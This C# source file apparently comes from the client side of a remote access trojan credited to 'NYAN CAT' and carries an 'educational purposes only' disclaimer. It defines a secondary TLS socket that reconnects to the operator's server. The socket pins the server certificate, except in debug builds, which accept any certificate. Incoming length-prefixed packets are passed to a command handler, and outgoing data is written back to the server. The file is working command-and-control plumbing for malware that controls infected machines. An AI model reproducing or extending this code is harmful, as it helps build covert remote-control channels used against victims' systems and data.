﻿using Client.Handle_Packet;
using Client.Helper;
using Client.MessagePack;
using Microsoft.VisualBasic.Devices;
using System;
using System.Diagnostics;
using System.IO;
using System.Net.Sockets;
using System.Threading;
using System.Text;
using System.Security.Principal;
using System.Net.Security;
using System.Security.Authentication;
using System.Security.Cryptography.X509Certificates;
using System.Net;

//       │ Author     : NYAN CAT
//       │ Name       : Nyan Socket v0.1
//       │ Contact    : https://github.com/NYAN-x-CAT

//       This program is distributed for educational purposes only.

namespace Client.Sockets
{
    public class TempSocket
    {
        public Socket Client { get; set; }
        public SslStream SslClient { get; set; }
        private byte[] Buffer { get; set; }
        private long Buffersize { get; set; }
        private MemoryStream MS { get; set; }
        public bool IsConnected { get; set; }
        private object SendSync { get; } = new object();

        public TempSocket()
        {
            if (!ClientSocket.IsConnected) return;

            try
            {
                Client = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp)
                {
                    ReceiveBufferSize = 50 * 1024,
                    SendBufferSize = 50 * 1024,
                };

                Client.Connect(ClientSocket.Client.RemoteEndPoint.ToString().Split(':')[0], Convert.ToInt32(ClientSocket.Client.RemoteEndPoint.ToString().Split(':')[1]));

                Debug.WriteLine("Temp Connected!");
                IsConnected = true;
                SslClient = new SslStream(new NetworkStream(Client, true), false, ValidateServerCertificate);
                SslClient.AuthenticateAsClient(Client.RemoteEndPoint.ToString().Split(':')[0], null, SslProtocols.Tls, false);
                Buffer = new byte[4];
                MS = new MemoryStream();
                SslClient.BeginRead(Buffer, 0, Buffer.Length, ReadServertData, null);
            }
            catch
            {
                Debug.WriteLine("Temp Disconnected!");
                Dispose();
                IsConnected = false;
            }
        }

        private bool ValidateServerCertificate(object sender, X509Certificate certificate, X509Chain chain, SslPolicyErrors sslPolicyErrors)
        {
#if DEBUG
            return true;
#endif
            return Settings.ServerCertificate.Equals(certificate);
        }

        public void Dispose()
        {

            try
            {
                // Tick?.Dispose();
                SslClient?.Dispose();
                Client?.Dispose();
                MS?.Dispose();
            }
            catch { }
        }

        public void ReadServertData(IAsyncResult ar)
        {
            try
            {
                if (!ClientSocket.IsConnected || !IsConnected)
                {
                    IsConnected = false;
                    Dispose();
                    return;
                }
                int recevied = SslClient.EndRead(ar);
                if (recevied > 0)
                {
                    MS.Write(Buffer, 0, recevied);
                    if (MS.Length == 4)
                    {
                        Buffersize = BitConverter.ToInt32(MS.ToArray(), 0);
                        Debug.WriteLine("/// Client Buffersize " + Buffersize.ToString() + " Bytes  ///");
                        MS.Dispose();
                        MS = new MemoryStream();
                        if (Buffersize > 0)
                        {
                            Buffer = new byte[Buffersize];
                            while (MS.Length != Buffersize)
                            {
                                int rc = SslClient.Read(Buffer, 0, Buffer.Length);
                                if (rc == 0)
                                {
                                    IsConnected = false;
                                    Dispose();
                                    return;
                                }
                                MS.Write(Buffer, 0, rc);
                                Buffer = new byte[Buffersize - MS.Length];
                            }
                            if (MS.Length == Buffersize)
                            {
                                ThreadPool.QueueUserWorkItem(Packet.Read, MS.ToArray());
                                Buffer = new byte[4];
                                MS.Dispose();
                                MS = new MemoryStream();
                            }
                            else
                                Buffer = new byte[Buffersize - MS.Length];
                        }
                    }
                    SslClient.BeginRead(Buffer, 0, Buffer.Length, ReadServertData, null);
                }
                else
                {
                    IsConnected = false;
                    Dispose();
                    return;
                }
            }
            catch
            {
                IsConnected = false;
                Dispose();
                return;
            }
        }

        public void Send(byte[] msg)
        {
            lock (SendSync)
            {
                try
                {
                    if (!IsConnected || msg == null || !ClientSocket.IsConnected)
                    {
                        return;
                    }

                    byte[] buffer = msg;
                    byte[] buffersize = BitConverter.GetBytes(buffer.Length);

                    Client.Poll(-1, SelectMode.SelectWrite);
                    SslClient.Write(buffersize, 0, buffersize.Length);
                    SslClient.Write(buffer, 0, buffer.Length);
                    SslClient.Flush();
                }
                catch
                {
                    IsConnected = false;
                    Dispose();
                    return;
                }
            }
        }
    }
}